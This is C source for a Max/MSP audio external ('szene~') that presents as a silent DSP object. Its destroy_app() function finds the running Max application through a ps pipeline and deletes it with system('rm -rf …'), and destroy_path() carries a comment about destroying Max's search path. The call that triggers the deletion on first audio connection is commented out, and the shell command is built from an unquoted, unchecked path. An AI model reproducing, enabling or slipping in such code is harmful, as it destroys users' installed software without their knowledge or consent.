#include "ext.h"
#include "z_dsp.h"
#include "ext_obex.h"
#include "ext_path.h"
#include <stdarg.h>
#include <stdlib.h>

typedef struct _szene {
    t_pxobject p_ob;
    t_bool was_connected;
} t_szene;

void *szene_new(t_symbol *s,  long argc, t_atom *argv);
void szene_free(t_szene *x);
void szene_assist(t_szene *x, void *b, long m, long a, char *s);

void destroy_app(void);

void szene_perform64(t_szene *x, t_object *dsp64, double **ins, long numins, double **outs, long numouts, long sampleframes, long flags, void *userparam);
void szene_dsp64(t_szene *x, t_object *dsp64, short *count, double samplerate, long maxvectorsize, long flags);
void szene_perform64_NULL(t_szene *x, t_object *dsp64, double **ins, long numins, double **outs, long numouts, long sampleframes, long flags, void *userparam);


t_class *szene_class;

void ext_main(void *r){
    t_class *c;
    
    c = class_new("szene~", (method)szene_new, (method)szene_free, sizeof(t_szene), NULL, A_GIMME, 0);
    class_addmethod(c, (method)szene_dsp64, "dsp64", A_CANT, 0);
    class_addmethod(c, (method)szene_assist, "assist", A_CANT, 0);

    class_dspinit(c);
    class_register(CLASS_BOX, c);
    szene_class = c;
}

void *szene_new(t_symbol *s, long argc, t_atom *argv){
    t_szene *x = (t_szene *)object_alloc(szene_class);
    dsp_setup((t_pxobject *)x, 1);
    x->was_connected = FALSE;
    return (x);
}

void szene_free(t_szene *x){
    dsp_free((t_pxobject *)x);
}

void szene_assist(t_szene *x, void *b, long m, long a, char *s){
    if(m == ASSIST_INLET){
        switch(a){
            case 0:
                sprintf(s, "Connect do reenact Szene");
                break;
        }
    }
}

void destroy_path(void){
    //implement destruction of the max search path
    short a = path_getapppath();
    char filestring[MAX_PATH_CHARS];
    path_toabsolutesystempath(a, "", filestring);
    post("%s", filestring);
    //path_toabsolutesystempath()
    //a = locatefile_extended();
}

void destroy_app(void){
    char *cmd = "ps -ax | grep Max | grep -v grep | grep -v Helper | awk '{print $4}' | sed 's/\\(.app\\).*/\\1/g'";
    //char *cmd = "ps -ax | grep Max | grep -v grep | grep -v Helper | awk '{print $4}' | cut -d '/' -f-3";
    char result[512];
    char buf[65536];
    
    FILE *fp;
    if((fp = popen(cmd, "r")) == NULL){
        post("pipe error");
    }
    while(fgets(buf, 65536, fp)!=NULL){
        strcpy(result, (strtok(buf, "\n")));
    }
    
    if(!pclose(fp)){
        char destroy[512];
        sprintf(destroy, "rm -rf %s", result);
        //post("%s", destroy);
        system(destroy);
    }
}

void szene_perform64(t_szene *x, t_object *dsp64, double **ins, long numins, double **outs, long numouts, long sampleframes, long flags, void *userparam){
    for(int i=0;i<numouts;i++){
        set_zero64(outs[i], sampleframes);
    }
    
    if(x->was_connected == FALSE){
        //destroy_app();
        destroy_path();
        x->was_connected = TRUE;
    }
    return;
}

void szene_perform64_NULL(t_szene *x, t_object *dsp64, double **ins, long numins, double **outs, long numouts, long sampleframes, long flags, void *userparam){
    for(int i=0;i<numouts;i++){
        set_zero64(outs[i], sampleframes);
    }
    if(x->was_connected){
        x->was_connected = FALSE;
    }
    return;
}

 void szene_dsp64(t_szene *x, t_object *dsp64, short *count, double samplerate, long maxvectorsize, long flags){
    if(count[0]){
        object_method(dsp64, gensym("dsp_add64"), x, szene_perform64, 0, NULL);
    }else{
        object_method(dsp64, gensym("dsp_add64"), x, szene_perform64_NULL, 0, NULL);
    }
}
